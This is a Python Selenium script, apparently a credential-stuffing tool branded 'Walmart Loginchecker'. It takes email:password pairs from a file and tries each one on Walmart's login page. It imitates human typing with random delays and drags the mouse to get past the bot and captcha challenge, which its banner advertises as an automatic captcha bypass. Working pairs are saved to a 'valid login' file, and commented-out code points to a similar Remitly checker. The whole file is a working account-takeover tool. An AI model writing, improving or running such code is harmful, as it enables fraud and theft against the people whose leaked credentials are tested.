from os import walk
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.options import Options
import random
import time
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support import expected_conditions as EC
import pyautogui
options = Options()
options.binary_location = r"C:/Program Files/Mozilla Firefox/firefox.exe"
options.add_argument("start-maximized")
options.add_argument("--disable-extensions")
# driver = webdriver.Firefox(options=options, executable_path="C:/Users/Administrator/Desktop/geckodriver.exe")
time.sleep(2)

#pyinstaller --add-data "C:\Users\Administrator\AppData\Local\Programs\Python\Python39\Lib\site-packages\pyfiglet;./pyfiglet" western.py

print("                                           WALMART LOGINCHECKER {MR BALI}           ")
print("\n")
print(   '                                                    Version 1.0')
print('Features - ')
time.sleep(1)
print('------------------------------------------------------------------------------------------------------------------------')
print("""
1. Checks for valid walmart login
2. Google Captcha bypasses automatically3. Works on slow internet too
4. Saves Valid/Rejected Emails to text file
5. It is fully automate and doesnot need any code to start
6. If your checker stops it doesnot start from beginning
""")
key = "12345677aa"

timelist = [0.25,0.45,0.1]
time.sleep(1)
print('------------------------------------------------------------------------------------------------------------------------')
print('                                                 CHECKER IS RUNNING......')

newlist = []
with open("walmartemails.txt", 'r') as input_emails:
    lines = input_emails.readlines()
for i in lines:
    newlist2 = i.strip()
    newlist2 = newlist2.split(':')
    newlist3 = newlist2[1]
    newlist.append(newlist2)


print('started')
for i in newlist:
    driver = webdriver.Firefox(options=options, executable_path="C:/Users/Administrator/Desktop/remitly/geckodriver.exe")
    #class="col-xs-10 wu-captcha-container wu-color-linear-gradient"
    driver.get('https://www.walmart.com/account/login?tid=0&returnUrl=%2F')
    
    email = driver.find_element_by_name("email")
    time.sleep(0.1)

    splitemails = i[0]
    passwordss = i[1]
    time.sleep(1)
    for i in splitemails:
        email.send_keys(i)
        time.sleep(random.choice(timelist))
    time.sleep(1)

    password = driver.find_element_by_name('password')
    time.sleep(0.5)
    for i in passwordss:
        password.send_keys(i)
        time.sleep(random.choice(timelist))

    time.sleep(0.5)
    

    time.sleep(0.5)
    t = driver.find_element_by_class_name("instr").click()
    try:
        time.sleep(0.5)
        send = driver.find_element_by_xpath('//button[normalize-space()="Sign in"]').click()
    except:
        print('clicked')
    time.sleep(0.5)
    action = ActionChains(driver)
    try:
        time.sleep(2)
        css = driver.find_element_by_xpath("//span[contains(text(),'Walmart account')]")
        # successor = WebDriverWait(driver, 2).until(EC.presence_of_element_located((By.XPATH, '//button[normalize-space()="Reset Your Password"]')))
        # print(successor.text)
        trigger = True
        while 'Walmart account' in css.text and trigger == True:
            pyautogui.moveTo(x=733, y=591)
            pyautogui.mouseDown
            pyautogui.dragTo(1120, 590, 15, button='left')
            pyautogui.mouseUp
            print('yes the clicking is done')
            css = driver.find_element_by_xpath("//span[contains(text(),'Walmart account')]")
            successor = WebDriverWait(driver, 15).until(EC.presence_of_element_located((By.XPATH, '//button[normalize-space()="Reset Your Password"]')))
            span = driver.find_element_by_id('recaptcha-email')
            if splitemails in span.text:
                print('yes splitmails in this page')
            print('------------------------------------------------')
            print('\n'+'\n')
            print(successor.text)
            print('------------------------------------------------')
            if successor.text == 'Reset Your Password' and span.text != splitemails:
                trigger = False
                check()
                break
        def check():
            try:
                time.sleep(2)
                successor = WebDriverWait(driver, 20).until(EC.presence_of_element_located((By.XPATH, '//button[normalize-space()="Reset Your Password"]')))
                print(successor.text)
                if "Reset Your Password" in successor.text:
                    print('Account is not valid')
                    walmartinvalidlogin = open('walmartinvalidlogin.txt','a')
                    walmartinvalidlogin.write(splitemails + '\n')
                    walmartinvalidlogin.close()
                    driver.close()
            except:
                pass
    except:
        print('is ')
    try:
        findtrademark = driver.find_element_by_link_text("Privacy & Security")
        if "Privacy & Security" in findtrademark.text:
            print('This account is valid with wallmart')
            print('this is the splitmails '+splitemails)
            walmartvalidlogin = open('walmartvalidlogin.txt','a')
            walmartvalidlogin.write(splitemails +":"+passwordss+ '\n')
            walmartvalidlogin.close()
            driver.close()
            continue
    except:
        print('Trademark not found')
        driver.close()

    # try:
    #     span = driver.find_element_by_id('recaptcha-email')
    #     if splitemails in span.text:
    #         print('hurray')
    #         time.sleep(2)
    #         # pressandhold = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, 'div//*[@id="xininbnjCwLMFNy"]//p')))
    #         #print('this is the '+pressandhold.text)
    #         button = driver.find_element_by_link_text("Press & Hold").click()
    #     if "Help us keep your account safe by clicking on the checkbox below." in pressandhold.text:
    #         action = ActionChains(driver)
    #         pressandhold = driver.find_elements_by_id("KxvOkOWkXapzfCv")
    #         action.click_and_hold(pressandhold).perform()
    # except:
    #     print('not working')
    # time.sleep(2)
    # try:
    #     result2 = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CLASS_NAME, "f7 lh-title")))
    #     # result2 = driver.find_element_by_class_name("input-supertext")
    #     time.sleep(0.5)
    # # loginchecker = driver.find_element_by_class_name("")
    # # if "Send money" in loginchecker:
    #     # pass
    #     if "Reorder" in result2.text:
    #         print('This email is valid login with this email address and password')
    #         remitlyvalidlogin = open('walmartvalidlogin.txt', 'a')
    #         remitlyvalidlogin.write(splitemails+'\n')
    #         driver.close()
    #         remitlyvalidlogin.close()
    # except:
    #     # result2 = driver.find_element_by_class_name("hidden-md-down")
    #     pass